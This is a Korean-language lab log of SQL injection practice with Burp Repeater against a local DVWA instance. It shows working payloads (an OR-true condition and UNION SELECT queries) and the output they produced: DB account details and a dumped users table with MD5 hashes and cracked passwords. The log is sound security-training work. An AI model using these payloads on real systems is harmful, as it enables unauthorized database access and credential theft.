# Day 2 — Burp Repeater SQLi 실습 결과

> 대상: DVWA (`http://localhost:8081/vulnerabilities/sqli/`)
> 도구: Burp Suite Repeater
> 날짜: 2026-04-02

---

## 실습 흐름

### 1. 싱글쿼터 테스트 → SQL 에러 확인
**페이로드**: `1'`
**결과**:
```
You have an error in your SQL syntax; check the manual that corresponds
to your MariaDB server version for the right syntax to use near ''1'''
```
→ 입력값이 쿼리에 그대로 삽입됨 + 에러 메시지 노출 확인

---

### 2. OR 조건 → 전체 유저 출력
**페이로드**: `1' OR '1'='1`
**결과**: DB의 모든 유저 5명 출력
```
admin / admin
Gordon / Brown
Hack / Me
Pablo / Picasso
Bob / Smith
```

---

### 3. UNION SELECT → DB 정보 추출
**페이로드**: `1' UNION SELECT user(),database()-- -`
**결과**:
```
First name: app@localhost   ← DB 접속 계정
Surname:    dvwa            ← 현재 DB 이름
```

---

### 4. users 테이블 덤프
**페이로드**: `1' UNION SELECT user,password FROM users-- -`
**결과**:
```
admin   → 5f4dcc3b5aa765d61d8327deb882cf99  (MD5: "password")
gordonb → e99a18c428cb38d5f260853678922e03  (MD5: "abc123")
1337    → 8d3533d75ae2c3966d7e0d4fcc69216b  (MD5: "charley")
pablo   → 0d107d09f5bbe40cade3de5c71e9e9b7  (MD5: "letmein")
smithy  → 5f4dcc3b5aa765d61d8327deb882cf99  (MD5: "password")
```
→ MD5는 크랙된 해시 DB로 역추적 가능 → bcrypt 사용해야 함

---

## 핵심 배운 점

1. **Burp Repeater** — 요청을 가로채 페이로드 수동 삽입 후 응답 비교
2. **URL 인코딩** — `'` → `%27`, 공백 → `+` (파라미터에 특수문자 포함 시 필요)
3. **UNION-based SQLi** — 컬럼 수 맞춰야 동작 (DVWA는 2개)
4. **`-- -` 주석** — MySQL은 `--` 뒤에 공백 필요, `-` 는 공백 보장 트릭
5. **MD5 위험성** — 해시 DB로 평문 역추적 가능 → bcrypt/argon2 사용해야 함

---

## OWASP 연결

| 취약점 | OWASP | CWE |
|--------|-------|-----|
| SQL Injection | A03:2021 – Injection | CWE-89 |
| 에러 메시지 노출 | A05:2021 – Security Misconfiguration | CWE-209 |
| 취약한 패스워드 해싱 (MD5) | A02:2021 – Cryptographic Failures | CWE-916 |

---

## Day 2 체크리스트

- [x] Burp 프록시 설정 완료
- [x] DVWA SQLi 요청 가로채기 성공
- [x] Repeater로 전송 성공
- [x] 싱글쿼터 테스트 → SQL 에러 확인
- [x] `OR '1'='1` → 전체 유저 출력 확인
- [x] UNION SELECT로 DB 정보 추출 성공
- [x] users 테이블 데이터 덤프 성공
